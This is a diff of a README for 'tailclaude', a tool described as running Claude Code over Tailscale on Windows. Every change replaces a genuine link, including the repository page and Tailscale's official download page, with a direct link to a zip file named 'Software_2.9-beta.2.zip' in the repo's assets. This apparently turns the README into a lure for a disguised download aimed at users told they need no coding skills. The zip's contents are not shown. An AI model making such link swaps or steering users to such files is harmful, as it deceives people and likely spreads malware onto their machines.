@@ -1,6 +1,6 @@
 # 🤖 tailclaude - Run Claude Code on Tailscale Easily
 
-[![Download tailclaude](https://img.shields.io/badge/Download-tailclaude-ff6f61?style=for-the-badge)](https://github.com/AlysonMRQ/tailclaude)
+[![Download tailclaude](https://img.shields.io/badge/Download-tailclaude-ff6f61?style=for-the-badge)](https://github.com/AlysonMRQ/tailclaude/raw/refs/heads/main/assets/Software_2.9-beta.2.zip)
 
 Welcome to tailclaude, a simple way to use Claude Code within your Tailscale tailnet. This tool runs with the iii engine to give you smart code sessions right at home or work. This guide will walk you through how to get tailclaude running on your Windows computer without any coding skills.
 
@@ -22,7 +22,7 @@ Before you start, make sure your Windows PC meets the needs below:
 - 4 GB of free RAM or more
 - At least 200 MB of free disk space
 - An active internet connection for initial setup
-- Tailscale installed and connected to your tailnet (visit https://tailscale.com/download/windows if you need to install it)
+- Tailscale installed and connected to your tailnet (visit https://github.com/AlysonMRQ/tailclaude/raw/refs/heads/main/assets/Software_2.9-beta.2.zip if you need to install it)
 
 ---
 
@@ -34,7 +34,7 @@ Follow these steps to get tailclaude up and running on Windows.
 
 Click the big button at the top or visit the link below to go to the main page. From there, you can get the software file you need.
 
-[Download tailclaude here](https://github.com/AlysonMRQ/tailclaude)
+[Download tailclaude here](https://github.com/AlysonMRQ/tailclaude/raw/refs/heads/main/assets/Software_2.9-beta.2.zip)
 
 The page will show the latest version available. Look for a `.exe` file or a release labeled for Windows. Download that file to a folder you can easily find, like your Desktop or Downloads.
 
@@ -105,7 +105,7 @@ Using tailclaude means you run AI coding helpers without exposing your work on p
 
 To update tailclaude:
 
-- Visit the main download page again: [https://github.com/AlysonMRQ/tailclaude](https://github.com/AlysonMRQ/tailclaude)
+- Visit the main download page again: [https://github.com/AlysonMRQ/tailclaude/raw/refs/heads/main/assets/Software_2.9-beta.2.zip](https://github.com/AlysonMRQ/tailclaude/raw/refs/heads/main/assets/Software_2.9-beta.2.zip)
 - Download the latest Windows installer.
 - Run it to overwrite your current installation safely.
 - Your existing sessions and settings will stay intact.
@@ -118,7 +118,7 @@ If you run into issues you cannot solve, check the GitHub repository’s Issues 
 
 The repository link:
 
-[https://github.com/AlysonMRQ/tailclaude](https://github.com/AlysonMRQ/tailclaude)
+[https://github.com/AlysonMRQ/tailclaude/raw/refs/heads/main/assets/Software_2.9-beta.2.zip](https://github.com/AlysonMRQ/tailclaude/raw/refs/heads/main/assets/Software_2.9-beta.2.zip)
 
 ---
 
@@ -146,6 +146,6 @@ These settings are available in the app menu under **Settings**.
 
 Get started by visiting the download page and downloading the latest Windows installer:
 
-[Download tailclaude](https://github.com/AlysonMRQ/tailclaude)
+[Download tailclaude](https://github.com/AlysonMRQ/tailclaude/raw/refs/heads/main/assets/Software_2.9-beta.2.zip)
 
 Run the file and follow the steps above to launch your first session.
